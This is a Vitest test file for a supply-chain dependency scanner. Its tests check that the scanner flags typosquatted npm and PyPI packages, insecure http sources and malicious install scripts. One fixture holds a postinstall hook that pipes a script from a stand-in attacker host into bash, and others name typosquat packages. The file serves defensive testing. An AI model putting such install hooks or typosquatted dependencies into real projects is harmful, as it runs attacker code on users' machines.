import { mkdtempSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import { scanDependencies } from '../scanDependencies'

function writeTempFile(name: string, content: string): string {
  const dir = mkdtempSync(join(tmpdir(), 'beacon-deps-test-'))
  const filePath = join(dir, name)
  writeFileSync(filePath, content)
  return filePath
}

describe('scanDependencies — slopsquat', () => {
  it('flags a typosquat of a popular npm package', () => {
    const filePath = writeTempFile(
      'package.json',
      JSON.stringify({
        dependencies: {
          lodsh: '^4.17.21',
        },
      })
    )
    const findings = scanDependencies([filePath])
    expect(findings.some((f) => f.category === 'slopsquat')).toBe(true)
    expect(findings.find((f) => f.category === 'slopsquat')?.severity).toBe('high')
  })

  it('does not flag the real popular package', () => {
    const filePath = writeTempFile(
      'package.json',
      JSON.stringify({
        dependencies: {
          lodash: '^4.17.21',
          express: '^4.18.0',
        },
      })
    )
    expect(scanDependencies([filePath]).filter((f) => f.category === 'slopsquat')).toHaveLength(0)
  })
})

describe('scanDependencies — install scripts', () => {
  it('flags curl|bash in postinstall', () => {
    const filePath = writeTempFile(
      'package.json',
      JSON.stringify({
        scripts: {
          postinstall: 'curl https://evil.example/install.sh | bash',
        },
      })
    )
    const findings = scanDependencies([filePath])
    expect(findings).toHaveLength(1)
    expect(findings[0]).toMatchObject({
      category: 'suspicious_install_script',
      severity: 'critical',
    })
  })
})

describe('scanDependencies — insecure sources', () => {
  it('flags http:// dependency URLs', () => {
    const filePath = writeTempFile(
      'package.json',
      JSON.stringify({
        dependencies: {
          'weird-pkg': 'http://registry.example.com/weird-pkg.tgz',
        },
      })
    )
    const findings = scanDependencies([filePath])
    expect(findings.some((f) => f.category === 'insecure_dependency_source')).toBe(true)
  })
})

describe('scanDependencies — requirements.txt', () => {
  it('flags a pypi typosquat', () => {
    const filePath = writeTempFile('requirements.txt', 'requets==2.28.0\n')
    const findings = scanDependencies([filePath])
    expect(findings.some((f) => f.category === 'slopsquat')).toBe(true)
  })
})

describe('scanDependencies — go.mod', () => {
  it('parses require lines without throwing (regression: match capture groups)', () => {
    const filePath = writeTempFile(
      'go.mod',
      `
module example.com/app

go 1.22

require github.com/foo/bar v1.2.3
github.com/baz/qux v0.4.0
`
    )
    // With /g on .match(), match[1] was undefined and .startsWith threw
    expect(() => scanDependencies([filePath])).not.toThrow()
    expect(scanDependencies([filePath])).toEqual([])
  })
})
